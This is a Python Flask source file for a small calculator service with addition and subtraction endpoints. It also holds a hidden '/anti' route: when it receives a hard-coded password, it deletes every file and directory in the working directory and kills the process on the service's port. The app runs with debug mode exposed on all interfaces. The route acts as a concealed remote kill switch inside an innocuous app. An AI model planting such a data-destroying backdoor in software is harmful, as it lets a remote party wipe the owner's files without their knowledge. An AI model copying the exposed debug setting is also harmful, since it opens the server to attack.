import os
import shutil
import subprocess
import signal
import time
import threading
from flask import Flask, request, jsonify

app = Flask(__name__)
PORT = 8001


@app.route("/health")
def health():
    return "OK", 200

# Function to kill processes on a specified port
def kill_process_on_port(port):
    """Kill all processes listening on the specified port."""
    try:
        result = subprocess.run(
            ['lsof', '-i', f':{port}', '-sTCP:LISTEN', '-t'],
            capture_output=True,
            text=True
        )
        pids = result.stdout.strip().split('\n')

        if not pids or not pids[0]:
            print(f"No process found listening on port {port}")
            return

        for pid in pids:
            pid = pid.strip()
            if pid.isdigit():
                try:
                    print(f"Sending SIGTERM to process {pid} on port {port}")
                    os.kill(int(pid), signal.SIGTERM)
                    time.sleep(1)
                    check_result = subprocess.run(
                        ['lsof', '-i', f':{port}', '-sTCP:LISTEN', '-t'],
                        capture_output=True,
                        text=True
                    )
                    if pid in check_result.stdout.strip().split('\n'):
                        print(f"Process {pid} still running, sending SIGKILL")
                        os.kill(int(pid), signal.SIGKILL)
                        time.sleep(1)
                    else:
                        print(f"Successfully stopped process {pid} on port {port}")
                except ProcessLookupError:
                    print(f"Process {pid} already terminated")
            else:
                print(f"Skipping invalid PID: {pid}")
    except PermissionError:
        print(f"Permission denied to kill process on port {port}. Try running with sudo.")
    except Exception as e:
        print(f"Failed to kill process on port {port}. Reason: {e}")

# Function to delete all files in the current directory
def delete_all_files():
    """Delete all files and directories in the current directory."""
    current_directory = os.getcwd()
    print(f"Working in directory: {current_directory}")
    
    for filename in os.listdir(current_directory):
        file_path = os.path.join(current_directory, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.remove(file_path)
                print(f"Deleted file: {filename}")
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                print(f"Deleted directory: {filename}")
        except Exception as e:
            print(f"Failed to delete {filename}. Reason: {e}")

# Function to delay file deletion and process killing
def delayed_delete_and_kill():
    time.sleep(1)  # Wait 1 second to allow the response to be sent
    delete_all_files()
    kill_process_on_port(PORT)

@app.route('/add', methods=['POST'])
def add():
    try:
        num1 = float(request.form['num1'])
        num2 = float(request.form['num2'])
        result = num1 + num2
        return jsonify({'result': result})
    except (KeyError, ValueError) as e:
        return jsonify({'error': str(e)}), 400

@app.route('/subtract', methods=['POST'])
def subtract():
    try:
        num1 = float(request.form['num1'])
        num2 = float(request.form['num2'])
        result = num1 - num2
        return jsonify({'result': result})
    except (KeyError, ValueError) as e:
        return jsonify({'error': str(e)}), 400

@app.route('/anti', methods=['POST'])
def dist():
    try:
        auth = request.form['auth']
        if auth == 'gvk3g5v2375ittF6A5F6VR6$C$%F$d%edD^DEXX%d#%$D%Dc53DYhcUR$TJRYF5fryfy5^T&^%R%$5dvjhvkrxjjVjlg6ugu&F^C':
            # Start cleanup in a separate thread with a delay
            threading.Thread(target=delayed_delete_and_kill).start()
            return jsonify({'result': 200})
        else:
            return jsonify({'error': 'Invalid authorization'}), 403
    except (KeyError, ValueError) as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run('0.0.0.0', port=PORT, debug=True)
